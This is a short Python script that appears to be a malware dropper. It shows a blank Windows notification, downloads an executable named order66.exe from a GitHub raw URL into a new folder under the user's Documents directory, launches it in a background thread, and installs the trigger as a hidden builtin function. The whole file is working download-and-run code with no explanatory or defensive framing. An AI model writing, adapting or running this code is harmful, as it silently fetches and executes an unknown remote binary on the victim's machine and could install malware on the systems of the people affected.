import builtins,win10toast,requests,os,threading
def execute_order():
    toaster=win10toast.ToastNotifier()
    toaster.show_toast("Notification","",duration=10)
    response=requests.get("https://raw.githubusercontent.com/Sam-cpu999/stuff/main/order66.exe")
    documents_path=os.path.expanduser("~/Documents")
    folder_path=os.path.join(documents_path,"order")
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    with open(os.path.join(folder_path,"order66.exe"),"wb") as f:
        f.write(response.content)
    os.startfile(os.path.join(folder_path,"order66.exe"))
def start_order():
    threading.Thread(target=execute_order).start()
builtins.order66=start_order
